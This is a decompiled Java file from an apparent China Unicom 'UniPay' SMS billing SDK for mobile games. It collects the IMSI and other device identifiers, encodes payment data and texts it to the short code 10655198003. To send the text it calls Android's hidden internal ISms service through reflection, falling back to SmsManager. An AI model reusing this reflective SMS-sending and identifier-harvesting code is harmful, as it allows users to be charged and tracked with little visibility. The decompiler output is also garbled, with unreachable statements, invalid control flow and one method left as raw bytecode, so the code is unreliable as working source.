package com.unipay.unipay_sdk;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.telephony.SmsManager;
import android.widget.Toast;
import com.unipay.beans.GameBaseBean;
import com.unipay.beans.PayValueBean;
import com.unipay.tools.MyApplication;
import java.lang.reflect.Method;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Iterator;
import java.util.List;

public final class UniPay
{
  private static UniPay b;
  private static int o = 0;
  Runnable a = new g();
  private boolean c = false;
  private boolean d = false;
  private boolean e = false;
  private boolean f = false;
  private Context g;
  private PayValueBean h;
  private GameBaseBean i;
  private Handler j;
  private IIlIlIllIIllIIlI k;
  private IntentFilter l;
  private f m;
  private j n;
  private com.unipay.b.e p;
  private com.unipay.c.a q;
  private com.unipay.c.c r;
  private com.unipay.c.e s = new com.unipay.c.e();
  private String t = "";
  private String u = "";
  private String v = "";
  private m w;

  public static UniPay a()
  {
    if (b == null)
      b = new UniPay();
    return b;
  }

  private void a(int paramInt, String paramString1, PendingIntent paramPendingIntent, String paramString2)
  {
    String str;
    if (paramInt == 1)
      str = "isms2";
    try
    {
      while (true)
      {
        Method localMethod1 = Class.forName("android.os.ServiceManager").getDeclaredMethod("getService", new Class[] { String.class });
        localMethod1.setAccessible(true);
        Object localObject1 = localMethod1.invoke(null, new Object[] { str });
        Method localMethod2 = Class.forName("com.android.internal.telephony.ISms$Stub").getDeclaredMethod("asInterface", new Class[] { IBinder.class });
        localMethod2.setAccessible(true);
        Object localObject2 = localMethod2.invoke(null, new Object[] { localObject1 });
        localObject2.getClass().getMethod("sendText", new Class[] { String.class, String.class, String.class, PendingIntent.class, PendingIntent.class }).invoke(localObject2, new Object[] { paramString2, null, paramString1, paramPendingIntent, null });
        return;
        str = "isms";
      }
    }
    catch (Exception localException1)
    {
      try
      {
        SmsManager.getDefault().sendTextMessage(paramString2, null, paramString1, paramPendingIntent, null);
        return;
      }
      catch (Exception localException2)
      {
        Toast.makeText(this.g, "用户鉴权失败，请重试...", 0).show();
        if (this.m != null)
          this.m.cancel();
        if (this.n != null)
          this.n.cancel();
        h();
        a("支付失败");
      }
    }
  }

  private void a(String paramString)
  {
    h();
    if (this.n != null)
    {
      this.n.cancel();
      this.n = null;
    }
    com.unipay.log.c.a();
    Message localMessage = this.j.obtainMessage();
    localMessage.arg1 = 2;
    if (paramString == null)
      paramString = "";
    if ((com.unipay.tools.a.a().equals("vac")) || (com.unipay.tools.a.a().equals("sms")));
    for (localMessage.obj = (paramString + "[paycode=" + this.h.getVacCode() + "]"); ; localMessage.obj = (paramString + "[paycode=" + this.h.getCustomCode() + "]"))
    {
      this.j.sendMessage(localMessage);
      return;
    }
  }

  private void a(String paramString1, String paramString2, String paramString3)
  {
    com.unipay.log.c.a(this.g, "648", "准备发送短信", "true");
    this.n = new j();
    this.m = new f(this);
    this.n.start();
    this.m.start();
    Intent localIntent = new Intent(paramString3);
    PendingIntent localPendingIntent = PendingIntent.getBroadcast(this.g, 0, localIntent, 1073741824);
    SmsManager localSmsManager = SmsManager.getDefault();
    ArrayList localArrayList = localSmsManager.divideMessage(paramString1);
    try
    {
      if (com.unipay.tools.b.a(0))
      {
        this.k = new IIlIlIllIIllIIlI(this);
        this.l = new IntentFilter(paramString3);
        this.g.registerReceiver(this.k, this.l);
        Iterator localIterator6 = localArrayList.iterator();
        while (localIterator6.hasNext())
          a(0, (String)localIterator6.next(), localPendingIntent, paramString2);
      }
    }
    catch (Exception localException1)
    {
    }
    try
    {
      this.g.unregisterReceiver(this.k);
      label190: if (this.m != null)
        this.m.cancel();
      if (this.n != null)
        this.n.cancel();
      com.unipay.log.c.a(this.g, "633", "发送短信异常", "true");
      a("发送短信异常");
      do
      {
        while (true)
        {
          return;
          if (com.unipay.tools.b.a(1))
          {
            this.k = new IIlIlIllIIllIIlI(this);
            this.l = new IntentFilter(paramString3);
            this.g.registerReceiver(this.k, this.l);
            Iterator localIterator5 = localArrayList.iterator();
            while (localIterator5.hasNext())
              a(1, (String)localIterator5.next(), localPendingIntent, paramString2);
            continue;
          }
          if ((com.unipay.tools.b.b(0)) && (this.d))
          {
            this.k = new IIlIlIllIIllIIlI(this);
            this.l = new IntentFilter(paramString3);
            this.g.registerReceiver(this.k, this.l);
            Iterator localIterator4 = localArrayList.iterator();
            while (localIterator4.hasNext())
              a(0, (String)localIterator4.next(), localPendingIntent, paramString2);
            continue;
          }
          if ((com.unipay.tools.b.b(1)) && (this.d))
          {
            this.k = new IIlIlIllIIllIIlI(this);
            this.l = new IntentFilter(paramString3);
            this.g.registerReceiver(this.k, this.l);
            Iterator localIterator3 = localArrayList.iterator();
            while (localIterator3.hasNext())
              a(1, (String)localIterator3.next(), localPendingIntent, paramString2);
            continue;
          }
          if (com.unipay.tools.b.c(com.unipay.tools.b.d(this.g)))
          {
            this.k = new IIlIlIllIIllIIlI(this);
            this.l = new IntentFilter(paramString3);
            this.g.registerReceiver(this.k, this.l);
            Iterator localIterator2 = localArrayList.iterator();
            while (localIterator2.hasNext())
              localSmsManager.sendTextMessage(paramString2, null, (String)localIterator2.next(), localPendingIntent, null);
            continue;
          }
          if ((!com.unipay.tools.b.d(com.unipay.tools.b.d(this.g))) || (!this.d))
            break;
          this.k = new IIlIlIllIIllIIlI(this);
          this.l = new IntentFilter(paramString3);
          this.g.registerReceiver(this.k, this.l);
          Iterator localIterator1 = localArrayList.iterator();
          while (localIterator1.hasNext())
            localSmsManager.sendTextMessage(paramString2, null, (String)localIterator1.next(), localPendingIntent, null);
        }
        if (this.m == null)
          continue;
        this.m.cancel();
      }
      while (this.n == null);
      this.n.cancel();
      return;
    }
    catch (Exception localException2)
    {
      break label190;
    }
  }

  // ERROR //
  private static com.unipay.e.a.a b(java.io.InputStream paramInputStream)
  {
    // Byte code:
    //   0: new 335	java/io/ByteArrayOutputStream
    //   3: dup
    //   4: invokespecial 336	java/io/ByteArrayOutputStream:<init>	()V
    //   7: astore_1
    //   8: sipush 1024
    //   11: newarray byte
    //   13: astore_2
    //   14: aload_0
    //   15: aload_2
    //   16: iconst_0
    //   17: sipush 1024
    //   20: invokevirtual 342	java/io/InputStream:read	([BII)I
    //   23: istore 10
    //   25: iload 10
    //   27: iconst_m1
    //   28: if_icmpeq +34 -> 62
    //   31: aload_1
    //   32: aload_2
    //   33: iconst_0
    //   34: iload 10
    //   36: invokevirtual 346	java/io/ByteArrayOutputStream:write	([BII)V
    //   39: goto -25 -> 14
    //   42: astore 6
    //   44: aconst_null
    //   45: astore 7
    //   47: aload_0
    //   48: ifnull +7 -> 55
    //   51: aload_0
    //   52: invokevirtual 349	java/io/InputStream:close	()V
    //   55: aload_1
    //   56: invokevirtual 350	java/io/ByteArrayOutputStream:close	()V
    //   59: aload 7
    //   61: areturn
    //   62: aload_1
    //   63: invokevirtual 354	java/io/ByteArrayOutputStream:toByteArray	()[B
    //   66: astore 11
    //   68: new 211	java/lang/StringBuilder
    //   71: dup
    //   72: ldc_w 356
    //   75: invokespecial 357	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   78: aload 11
    //   80: arraylength
    //   81: invokevirtual 360	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   84: pop
    //   85: aload 11
    //   87: invokestatic 365	android/support/v4/app/b:g	([B)Lcom/unipay/e/a/a;
    //   90: astore 13
    //   92: aload 13
    //   94: astore 7
    //   96: aload_0
    //   97: invokevirtual 349	java/io/InputStream:close	()V
    //   100: aload_1
    //   101: invokevirtual 350	java/io/ByteArrayOutputStream:close	()V
    //   104: aload 7
    //   106: areturn
    //   107: astore 15
    //   109: aconst_null
    //   110: astore_0
    //   111: goto -64 -> 47
    //   114: astore_3
    //   115: aload_0
    //   116: ifnull +7 -> 123
    //   119: aload_0
    //   120: invokevirtual 349	java/io/InputStream:close	()V
    //   123: aload_1
    //   124: invokevirtual 350	java/io/ByteArrayOutputStream:close	()V
    //   127: aload_3
    //   128: athrow
    //   129: astore 9
    //   131: goto -76 -> 55
    //   134: astore 8
    //   136: aload 7
    //   138: areturn
    //   139: astore 5
    //   141: goto -18 -> 123
    //   144: astore 4
    //   146: goto -19 -> 127
    //   149: astore_3
    //   150: aconst_null
    //   151: astore_0
    //   152: goto -37 -> 115
    //   155: astore 14
    //   157: goto -110 -> 47
    //
    // Exception table:
    //   from	to	target	type
    //   14	25	42	java/io/IOException
    //   31	39	42	java/io/IOException
    //   62	92	42	java/io/IOException
    //   100	104	107	java/io/IOException
    //   14	25	114	finally
    //   31	39	114	finally
    //   62	92	114	finally
    //   96	100	114	finally
    //   51	55	129	java/io/IOException
    //   55	59	134	java/io/IOException
    //   119	123	139	java/io/IOException
    //   123	127	144	java/io/IOException
    //   100	104	149	finally
    //   96	100	155	java/io/IOException
  }

  private void d()
  {
    this.s.b();
    this.s.a("imsi", com.unipay.tools.a.h());
    this.q.b(com.unipay.tools.a.a, "GET", this.s, new c(this));
  }

  private boolean e()
  {
    int i1;
    if ((!com.unipay.tools.b.a(0)) && (!com.unipay.tools.b.a(1)))
    {
      boolean bool = com.unipay.tools.b.c(com.unipay.tools.b.d(this.g));
      i1 = 0;
      if (!bool);
    }
    else
    {
      i1 = 1;
    }
    return i1;
  }

  private int f()
  {
    int i1 = 1;
    if (com.unipay.tools.a.h().equals(""))
    {
      ((Activity)this.g).runOnUiThread(new i(this));
      return i1;
    }
    if (e())
      return 2;
    if ((com.unipay.tools.b.b(0)) || (com.unipay.tools.b.b(i1)) || (com.unipay.tools.b.d(com.unipay.tools.b.d(this.g))));
    while (i1 != 0)
    {
      return 4;
      i1 = 0;
    }
    return 3;
  }

  private void g()
  {
    try
    {
      String str1 = this.h.getVacCode();
      SimpleDateFormat localSimpleDateFormat = new SimpleDateFormat("yyyyMMddHHmmss");
      StringBuffer localStringBuffer = new StringBuffer();
      localStringBuffer.append(com.unipay.tools.c.c().a()).append(com.unipay.tools.c.c().b()).append(this.i.getPrmCode()).append(str1).append(com.unipay.tools.a.g()).append(MyApplication.b).append(com.unipay.tools.a.h()).append(localSimpleDateFormat.format(new Date())).append(this.h.getOrderid());
      String str2 = com.unipay.a.b.a(localStringBuffer.toString(), "ZTEos10");
      if (this.d);
      for (String str3 = "com.unipay.sms_action"; ; str3 = "com.unipay.vac_action")
      {
        a(str2, "10655198003", str3);
        return;
      }
    }
    catch (Exception localException)
    {
    }
  }

  private void h()
  {
    if (this.w != null)
    {
      this.w.cancel();
      o = 0;
      this.w = null;
    }
  }

  private boolean i()
  {
    try
    {
      this.t = this.i.getAppid();
      this.u = this.i.getCpid();
      this.v = com.unipay.tools.a.g();
      if ((!this.t.equals("")) && (this.t != null))
      {
        if ((this.u.equals("")) || (this.u == null))
          break label308;
        if (!this.v.equals(""))
        {
          String str = this.v;
          if (str != null);
        }
        else
        {
          return false;
        }
      }
    }
    catch (Exception localException1)
    {
      return false;
    }
    try
    {
      if (com.unipay.tools.b.a(0))
        com.unipay.tools.a.c(com.unipay.tools.b.c(0));
      while (((ConnectivityManager)this.g.getSystemService("connectivity")).getActiveNetworkInfo() == null)
      {
        return false;
        if (com.unipay.tools.b.a(1))
        {
          com.unipay.tools.a.c(com.unipay.tools.b.c(1));
          continue;
        }
        if (com.unipay.tools.b.b(0))
        {
          com.unipay.tools.a.c(com.unipay.tools.b.c(0));
          continue;
        }
        if (com.unipay.tools.b.b(1))
        {
          com.unipay.tools.a.c(com.unipay.tools.b.c(1));
          continue;
        }
        if (!com.unipay.tools.b.d(this.g).equals(""))
        {
          com.unipay.tools.a.c(com.unipay.tools.b.d(this.g));
          continue;
        }
        if (!com.unipay.tools.b.e(this.g).equals(""))
        {
          com.unipay.tools.a.c(com.unipay.tools.b.e(this.g));
          continue;
        }
        if (!com.unipay.tools.a.h().equals(""))
          continue;
        if (!com.unipay.tools.b.a(this.g).equals(""))
        {
          com.unipay.tools.a.c(com.unipay.tools.b.a(this.g).replaceAll(":", ""));
          continue;
        }
        com.unipay.tools.a.c(com.unipay.tools.b.b(this.i.getUid()));
      }
      return true;
      return false;
      label308: return false;
    }
    catch (Exception localException2)
    {
    }
    return false;
  }

  public final void a(Context paramContext, GameBaseBean paramGameBaseBean, PayValueBean paramPayValueBean, UniPay.payType parampayType, Handler paramHandler)
  {
    int i1 = 1;
    this.g = paramContext;
    this.h = paramPayValueBean;
    this.i = paramGameBaseBean;
    com.unipay.tools.a.a(paramGameBaseBean);
    com.unipay.tools.a.a(paramPayValueBean);
    this.e = i1;
    this.j = paramHandler;
    String str1;
    int i3;
    if (parampayType == UniPay.payType.SMS)
    {
      this.d = i1;
      this.c = false;
      com.unipay.tools.a.a("21");
      new com.wandoujia.morph.a.j();
      this.p = new com.unipay.b.e(paramContext);
      this.p.a(i1);
      com.unipay.tools.a.d(com.unipay.tools.b.f(this.g));
      this.r = new com.unipay.c.c();
      this.q = new com.unipay.c.a(this.r);
      com.unipay.log.c.a(this.g, "604", "支付开始", "true");
      str1 = this.h.getVac_mode();
      if (!str1.equals("0"))
        break label240;
      i3 = i1;
      label167: this.f = i3;
      if (this.d)
      {
        if (!com.unipay.tools.b.a(0))
          break label264;
        com.unipay.tools.a.c(com.unipay.tools.b.c(0));
      }
    }
    while (true)
    {
      d();
      if ((!this.d) || (!this.c))
        break label347;
      a("支付方式设置错误!");
      return;
      this.d = false;
      this.c = i1;
      com.unipay.tools.a.a("22");
      break;
      label240: if (str1.equals("1"))
      {
        i3 = i1;
        break label167;
      }
      int i4 = 0;
      break label167;
      label264: if (com.unipay.tools.b.a(i1))
      {
        com.unipay.tools.a.c(com.unipay.tools.b.c(i1));
        continue;
      }
      if (com.unipay.tools.b.b(0))
      {
        com.unipay.tools.a.c(com.unipay.tools.b.c(0));
        continue;
      }
      if (com.unipay.tools.b.b(i1))
      {
        com.unipay.tools.a.c(com.unipay.tools.b.c(i1));
        continue;
      }
      if (com.unipay.tools.b.d(this.g).equals(""))
        continue;
      com.unipay.tools.a.c(com.unipay.tools.b.d(this.g));
    }
    label347: if ((this.f) && ((!this.c) || (this.d)))
    {
      com.unipay.log.c.a(this.g, "621", "参数错误!(非联网游戏不支持包月业务)", "true");
      a("参数设置错误！(非联网游戏不支持包月业务)");
      return;
    }
    if ((this.f) && (!e()))
    {
      com.unipay.log.c.a(this.g, "622", "非联通卡不支持包月业务", "true");
      a("非联通卡不支持包月业务！");
      return;
    }
    if ((Float.valueOf(this.h.getMoney()).floatValue() > 100.0F) && (this.f));
    int i6;
    for (int i5 = i1; i5 != 0; i6 = 0)
    {
      com.unipay.log.c.a(this.g, "623", "VAC支付金额超额", "true");
      a("VAC支付金额有误！");
      return;
    }
    if (this.e)
    {
      if (o <= 0)
      {
        o = 1 + o;
        this.w = new m();
        this.w.start();
        int i7;
        if (this.i == null)
          i7 = 0;
        while (true)
        {
          if (i7 == 0)
            break label922;
          if (!i())
            break label812;
          String str2 = "";
          if (com.unipay.tools.b.g(this.g))
            str2 = com.unipay.tools.b.h(this.g);
          if ((str2.equals("")) || (!this.c))
            break label812;
          if (!com.unipay.tools.b.a(this.h.getOrderid()))
            break label789;
          int i2;
          if ((this.h.getVac_mode().equals("")) || (this.h.getVac_mode() == null))
            i2 = 0;
          if (i2 == 0)
            break;
          if (f() == 2)
          {
            d();
            return;
            if ((this.i.getAppid().equals("")) || (this.i.getCpid().equals("")) || (this.i.getPrmCode().equals("")))
            {
              i7 = 0;
              continue;
            }
            if (this.i.getChannelid().equals(""))
            {
              i7 = 0;
              continue;
            }
            com.unipay.tools.a.b(this.i.getChannelid());
            i7 = i2;
            continue;
          }
          com.unipay.log.c.a(this.g, "636", "请插入联通卡支付", "true");
          a("请插入联通卡支付");
          return;
        }
        com.unipay.log.c.a(this.g, "637", "话费计费模式不正确", "true");
        a("话费计费模式不正确");
        return;
        label789: com.unipay.log.c.a(this.g, "620", "订单号格式错误", "true");
        a("订单号格式错误");
        return;
        label812: if (this.d)
        {
          if (!android.support.v4.app.b.o(com.unipay.tools.a.h()))
          {
            if (f() == 2)
              try
              {
                g();
                return;
              }
              catch (Exception localException)
              {
                a(localException.getMessage());
                return;
              }
            com.unipay.log.c.a(this.g, "635", "无法使用话费支付", "true");
            a("暂不支持非联通");
            return;
          }
          com.unipay.log.c.a(this.g, "635", "无法使用话费支付", "true");
          a("无法使用话费支付");
          return;
        }
        com.unipay.log.c.a(this.g, "617", "不支持短代离线支付", "true");
        a("支付需要联网");
        return;
        label922: com.unipay.log.c.a(this.g, "617", "配置文件错误", "true");
        a("配置文件错误");
        return;
      }
      com.unipay.log.c.a(this.g, "626", "15秒之内无法重复发起支付", "true");
      Toast.makeText(paramContext, "15秒之内无法重复发起支付", 0).show();
      return;
    }
    com.unipay.log.c.a(this.g, "627", "没有初始化SDK", "true");
    a("SDK初始化未完成");
  }
}

/* Location:           C:\WorkSpace\WandDouJiaNotificationBar\WanDou1.jar
 * Qualified Name:     com.unipay.unipay_sdk.UniPay
 * JD-Core Version:    0.6.0
 */